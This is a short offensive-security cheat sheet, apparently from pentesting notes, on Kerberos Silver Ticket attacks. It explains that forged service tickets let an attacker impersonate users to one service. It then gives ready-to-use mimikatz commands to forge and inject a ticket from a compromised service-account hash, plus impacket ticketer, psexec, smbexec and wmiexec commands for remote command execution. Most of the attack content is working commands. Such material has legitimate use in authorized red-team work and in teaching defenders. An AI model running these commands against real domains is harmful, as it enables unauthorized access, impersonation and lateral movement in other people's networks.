# Silver Ticket

## Silver Ticket

Silver Tickets enable an attacker to create forged service tickets (TGS tickets). In this attack, user/group permissions in a Service Ticket are blindly trusted by the application on a target server running in the context of the service account. We can forge our own Service Ticket (Silver Ticket) to access a specific service (e.g. IIS, MSSQL) with the permissions of the user or service account. If the SPN/service account is used across multiple servers, we can leverage our Silver Ticket against all.

> Note: Unlike a Golden Ticket, a silver ticket works for one service only.

* Example of PTT via compromised MSSQLSvc hash: https://stealthbits.com/blog/impersonating-service-accounts-with-silver-tickets/

Create a silver ticket via compromised host:

```powershell
# obtain SID of domain (remove RID -XXXX) at the end of the user SID string.
cmd> whoami /user
corp\offsec S-1-5-21-1602875587-2787523311-2599479668[-1103]

# generate the Silver Ticket (TGS) and inject it into memory
mimikatz > kerberos::golden /user:[user_name] /domain:[domain_name].com /sid:[sid_value] 
        /target:[service_hostname] /service:[service_type] /rc4:[hash] /ptt
        
# abuse Silver Ticket (TGS)
cmd> psexec.exe -accepteula \\<remote_hostname> cmd   # psexec
cmd> sqlcmd.exe -S [service_hostname]                 # if service is MSSQL
```

Use a silver ticket in Kali Linux:

```bash
# generate the Silver Ticket with NTLM
$ python ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>

# set the ticket for impacket use
$ export KRB5CCNAME=<TGT_ccache_file_path>

# execute remote commands with any of the following by using the TGT
$ python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
$ python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
$ python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```
